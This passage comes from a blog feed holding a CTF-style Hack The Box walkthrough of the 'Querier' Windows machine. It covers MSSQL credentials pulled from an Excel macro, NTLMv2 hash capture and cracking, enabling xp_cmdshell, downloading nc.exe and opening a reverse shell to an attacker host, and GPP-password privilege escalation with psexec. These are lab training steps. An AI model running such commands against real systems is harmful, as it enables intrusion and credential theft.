&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-cracking-the-hash-on-another-box-the-password-is-corporate568-now-we-can-use-runas-to-run-heidi-as-mssql-svc-&quot;&gt;After cracking the hash on another box the password is &lt;code class=&quot;highlighter-rouge&quot;&gt;corporate568&lt;/code&gt;. Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;queries-to-enable-xp_cmdshell-&quot;&gt;Queries to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-we-got-rce-i-ran-a-python-server-to-host-ncexe-then-i-downloaded-it-on-the-box-and-got-a-reverse-shell-&quot;&gt;Great, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I downloaded it on the box and got a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;as-i-said-in-the-first-post-when-i-checked-group-policy-passwords-i-found-administrators-password-there-are-privilege-escalation-enumeration-scripts-for-windows-like-linenumsh-for-linux-one-of-them-is-powerupps1-and-it-checks-for-group-policy-passwords-lets-check-that-one-&quot;&gt;As I said in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt;, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; for Linux one of them is &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powerup.ps1&lt;/code&gt;&lt;/a&gt; and it checks for group policy passwords. Let’s check that one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/23.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-also-decrypts-the-password-which-is-nice-password--myunclesaremarioandluigi1&quot;&gt;It also decrypts the password which is nice. Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-can-use-psexec-to-get-a-shell-as-administrator-i-used-runas-to-start-cmd-as-querieradministrator-then-i-used-psexec-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; to get a shell as Administrator. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to start &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;QUERIER\Administrator&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\Administrator cmd.exe&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec \\querier.htb cmd&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;first-write-up--hack-the-box---querier&quot;&gt;First write-up : &lt;a href=&quot;/hack-the-box/querier&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare' Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe'; EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337' We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab Next Hack The Box write-up : Hack The Box - Netmon</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier-2/0.png" /></entry><entry><title type="html">Hack The Box - Querier</title><link href="http://localhost:4000/hack-the-box/querier/" rel="alternate" type="text/html" title="Hack The Box - Querier" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-querier-retired-and-heres-my-write-up-about-it-it-was-a-great-windows-machine-covering-some-interesting-stuff-and-i-enjoyed-iti-wrote-two-posts-for-this-machine-first-one-solving-it-with-kali-and-the-other-one-solving-it-with-commando-vm-you-can-find-the-second-post-here-its-a-windows-box-and-its-ip-is-101010125-i-added-it-to-etchosts-as-querierhtb-lets-jump-right-in&quot;&gt;Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post &lt;a href=&quot;/hack-the-box/querier-2/&quot;&gt;here&lt;/a&gt;. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in!&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-first-i-used-smbclient-&quot;&gt;We need to list the shares first. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient --list //querier.htb/ -U &quot;&quot;
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to querier.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;obviously-if-theres-an-anonymously-accessible-share-it-will-be-reports-lets-see-whats-in-there-&quot;&gt;Obviously if there’s an anonymously accessible share it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt;, Let’s see what’s in there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# smbclient //querier.htb/Reports/ -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                6469119 blocks of size 4096. 1608855 blocks available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;only-an-excel-file&quot;&gt;Only an Excel file.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: \&amp;gt; get &quot;Currency Volume Report.xlsm&quot;
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (17.1 KiloBytes/sec) (average 17.1 KiloBytes/sec)
smb: \&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# file Currency\ Volume\ Report.xlsm 
Currency Volume Report.xlsm: Microsoft Excel 2007+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql-credentials-from-reportxlsm&quot;&gt;MSSQL Credentials from Report.xlsm&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-the-contents-of-the-excel-file-by-just-viewing-it-as-it-will-be-opened-with-the-archive-manager-&quot;&gt;I checked the contents of the excel file by just viewing it as it will be opened with the archive manager :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-xl-i-found-vbaprojectbin-so-i-used-olevba-from-oletools-to-see-if-i-can-get-anything-&quot;&gt;in &lt;code class=&quot;highlighter-rouge&quot;&gt;xl&lt;/code&gt; I found &lt;code class=&quot;highlighter-rouge&quot;&gt;vbaProject.bin&lt;/code&gt; so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; from &lt;a href=&quot;https://www.decalage.info/python/oletools&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;oletools&lt;/code&gt;&lt;/a&gt; to see if I can get anything :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# olevba Currency\ Volume\ Report.xlsm 
olevba 0.54.2 on Python 2.7.16 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox &quot;connection successful&quot;
 
  'Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)
  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)
  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-we-got-connection-credentials-for-the-mssql-server-&quot;&gt;Great, we got connection credentials for the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
&lt;h4 id=&quot;i-used-mssqlclientpy-from-impacket-to-connect-to-the-server-first-attempt-failed-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;mssqlclient.py&lt;/code&gt; from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt;&lt;/a&gt; to connect to the server. First attempt failed :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# /opt/impacket/examples/mssqlclient.py reporting@querier.htb -db volume 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-added-the-windows-authentication-option--windows-auth-and-it-worked-&quot;&gt;I added the windows authentication option (&lt;code class=&quot;highlighter-rouge&quot;&gt;-windows-auth&lt;/code&gt;) and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;unfortunately--permission-denied-for-xp_cmdshell-&quot;&gt;Unfortunately … permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-responder-responder--i-tun0-and-used-xp_dirtree-to-see-what-hashes-can-i-catch-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;responder -I tun0&lt;/code&gt;) and used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; to see what hashes can I catch :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:53af3039d4607fd0:2423D19E432FFDDC2E4BF3B1E45272A5:0101000000000000C0653150DE09D201C11337A1C52B6EA7000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000051E8A512CD87D5811D02139C02C80CC4814E3213A0CCBD9EC4B588C8FCC85AD70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310039002E0032003700000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::1d968811d030fdad::
[*] Skipping previously captured hash for \gX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-we-got-the-ntlmv2-hash-for-mssql-svc&quot;&gt;And we got the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-john-and-rockyou-to-crack-the-hash-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; to crack the hash :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:07 DONE (2019-06-21 07:41) 0.1321g/s 1184Kp/s 1184Kc/s 1184KC/s correforenz..corby909
Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-its-time-to-enable-xp_cmdshell-and-get-a-reverse-shell&quot;&gt;Now it’s time to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; and get a reverse shell.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-rce-i-ran-a-python-server-to-host-ncexe-then-i-used-invoke-webrequest-to-download-it-&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt; to download it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; EXEC xp_cmdshell 'powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\appdata\local\temp\nc.exe http://10.10.xx.xx/nc.exe'
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
NULL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-got-a-reverse-shell-&quot;&gt;Then I got a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'C:\Users\mssql-svc\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1337'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;one-of-the-things-to-check-when-enumerating-windows-machines-is-group-policy-passwords-which-happened-to-be-the-privilege-escalation-vector-here-i-checked-group-policy-passwords-and-found-administrators-password-&quot;&gt;One of the things to check when enumerating Windows machines is group policy passwords which happened to be the privilege escalation vector here. I checked group policy passwords and found Administrator’s password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/10.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/querier/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;groupsxml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Groups.xml&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
